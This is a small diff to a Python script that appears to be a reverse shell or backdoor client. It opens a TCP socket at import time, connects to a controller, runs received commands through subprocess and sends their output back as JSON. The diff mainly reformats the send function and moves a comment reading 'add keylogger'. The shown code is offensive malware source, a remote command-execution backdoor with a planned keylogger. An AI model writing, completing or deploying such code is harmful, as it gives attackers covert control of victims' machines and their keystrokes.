@@ -5,9 +5,12 @@ import subprocess
 import json
 import os
 
+
 def reliable_send(data):
-        jsondata = json.dumps(data)
-        s.send(jsondata.encode())
+	'''Send Data Function.'''
+	jsondata = json.dumps(data)
+	s.send(jsondata.encode())
+
 
 def reliable_recv():
         data = ''
@@ -17,8 +20,6 @@ def reliable_recv():
                         return json.loads(data)
                 except ValueError:
                         continue
-
-
 
 
 def connection():
@@ -69,9 +70,9 @@ def shell():
 			result = execute.stdout.read() + execute.stderr.read()
 			result = result.decode()
 			reliable_send(result)
+#add keylogger
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
 
 
-#add keylogger
